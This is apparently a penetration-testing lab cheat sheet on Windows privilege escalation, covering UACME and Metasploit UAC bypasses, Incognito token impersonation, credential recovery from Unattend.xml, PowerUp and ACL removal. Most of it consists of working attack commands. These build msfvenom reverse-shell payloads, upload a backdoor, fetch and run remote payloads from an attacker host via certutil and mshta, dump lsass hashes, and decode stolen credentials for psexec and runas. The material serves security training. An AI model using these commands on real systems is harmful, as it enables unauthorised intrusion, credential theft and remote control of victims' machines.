# UAC Bypass - UACME

**Description**: UACME is a post-exploitation tool that bypasses UAC by abusing trusted Windows components, allowing code execution with elevated privileges. It requires local admin rights.

1) Set up the listener

```shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<my_local_IP> LPORT=<local_port> -f exe > 'backdoor.exe'
# We need to setup our multi handler to receive the connection once the payload is executed on the target
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <LOCAL_HOST_IP>
set LPORT <LOCAL_PORT> # The same configured above
exploit
```

2) Transfer Akagi 64 over to the target system

```shell
# Back to the Meterpreter session (exit command from shell session)
pwd 
cd C:\\Users\\admin\\AppData\\Local\\Temp
upload /root/backdoor.exe
upload /root/Desktop/tools/UACME/Akagi64.exe

shell
# If we want to execute backdoor.exe with administrative privileges we need to use method 23
# Note: Please provide the full path of the backdoor executable
Akagi64.exe 23 C:\Users\admin\AppData\Local\Temp\backdoor.exe
# Once we execute the above command we would expect a meterpreter session
# We have successfully gained high privilege access
# We can dump the user hashes
pgrep lsass.exe
migrate <process_ID>
hashdump

# Check now
sysinfo
getid
getprivs # Now we have elevated privileges even though we have access to the main user
```

<br>

# UAC Bypass - Memory Injection (Metasploit)

```shell
use exploit/windows/local/bypassuac_injection
set SESSION 1
set TARGET 1
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit
# Please note the explorer.exe arch is x64 bit, so later when we perform UAC bypass, we have to use x64 based meterpreter payload.
getsystem
getuid

ps -S lsass.exe
migrate <process_ID>

hashdump
```

<br>

# Impersonate

**Description**: Impersonation in Windows lets an attacker adopt another user's security context to act on their behalf. Tools like Incognito allow token impersonation for privilege escalation or lateral movement.
The `getprivs` command lists all privileges assigned to the current user. Key privileges like `SeImpersonatePrivilege` can enable privilege escalation.

```shell
getprivs
# SeImpersonatePrivilege. This means that we can use this Meterpreter session to impersonate other available access tokens.
```

**Incognito** is a post-exploitation tool for token manipulation, enabling attackers to list, steal, and impersonate high-privilege user tokens.

```shell
load incognito 
list_tokens -u
impersonate_token "ATTACKDEFENSE\Administrator"

getuid
getprivs

pgrep explorer
migrate <process_number>
```

<br>

# Searching For Password in Windows Configuration Files

Unattended setup files like Unattend.xml or Autounattend.xml may contain plaintext credentials, which attackers can use for legitimate Windows authentication.
- C:\Windows\Panther\Unattend.xml
- C:\ Windows\Panther\Autounattend.xml

```shell
# This payload will establish a reverse connection from the target machine back to the attacker's machine
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<local_IP> LPORT=<port_number> -f exe > payload.exe

# Set up a simple HTTP server to host the payload. This allows the target system to download the payload from your machine
python -m SimpleHTTPServer 80

# Use certutil to download the payload from the attacker's HTTP server
certutil -urlcache -f http://<kali_IP>/payload.exe payload.exe

# Prepare the Metasploit multi-handler to receive the reverse connection. Stop the web server and set up Metasploit
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LPORT 1234
set LHOST <my_IP>
run  # Starts listening for incoming connections

# Once the target runs the payload, a Meterpreter session will open
sysinfo

# Search for sensitive configuration files on the target
search -f Unattend.xml  # This search might take some time depending on the system size

# Navigate to the directory where 'Unattend.xml' is usually stored and download the configuration file containing potential credentials
download unattend.xml

# Extract and analyze potential plaintext credentials. View the contents of the file to locate sensitive information such as AutoLogon passwords.
cat unattend.xml
# Paste the Base64-encoded password found in the file into a new text file for decoding.
vim password.txt
# Decode the password from Base64 format to reveal the plaintext credentials.
base64 -d password.txt <optional_output_file>

# Validate the extracted credentials using PsExec. If the password hasn't been changed since installation, you can attempt authentication.
# Use Impacket's PsExec tool to execute commands remotely on the compromised machine.
psexec.py Administrator@<target_IP>
<password>  # Enter the decoded password.

# Verify if you successfully gained administrative access.
whoami  # Should return "NT AUTHORITY\SYSTEM" if successful.
```

<br>

# PowerUp

PowerUp.ps1 is a PowerShell script used to identify privilege escalation opportunities caused by Windows misconfigurations. It is part of the PowerSploit post-exploitation framework.

```shell
# Target Machine
cd .\Desktop\PowerSploit\Privesc\ # In this case PowerUp was provided
ls

# Import PowerUp.ps1 script and Invoke-PrivescAudit function
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck" # PowerShell execution policy bypass
# We can notice the Unattend.xml file present on the system
# The file may contain encoded or plain-text credentials and other sensitive information
cat C:\Windows\Panther\Unattend.xml

# Decoding administrator password using Powershell
$password='QWRtaW5AMTIz'
$password=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($password))
echo $password

# We are running a command prompt as an administrator user using discovered credentials
runas.exe /user:administrator cmd # Enter the password, e.g. Admin@123
whoami
# We are running cmd.exe as an administrator
```

**Kali Machine**

```shell
# Running the hta_server module to gain the meterpreter shell
msfconsole -q
use exploit/windows/misc/hta_server
exploit
```

**Target Machine**

```shell
# Copy the generated payload i.e “http://10.10.31.2:8080/Bn75U0NL8ONS.hta” and run it on cmd.exe with mshta command to gain the meterpreter shell
mshta.exe http://10.10.31.2:8080/Bn75U0NL8ONS.hta

# We can expect a meterpreter shell.
# Read the flag
sessions -i 1
cd C:\\Users\\Administrator\\Desktop
dir
cat flag.txt
```

<br>

# SeImpersonatePrivilege

```shell
getsystem
# We can use getsystem to elevate the privileges because if SeImpersonatePrivilege is present, getsystem is likely to succeed using Named Pipe Impersonation.
```

<br>

# Remove from Access Control List (ACL)

```shell
# After gained access to the system
# Let’s try to navigate to the flag directory, but we don’t have the necessary access permissions.

# Let’s check the permissions using the command:
icacls flag

# So, as we can see, it has a deny permission for NT AUTHORITY\SYSTEM . Let's remove this restriction by using the command:
icacls flag /remove:d "NT AUTHORITY\SYSTEM"

cd flag
```
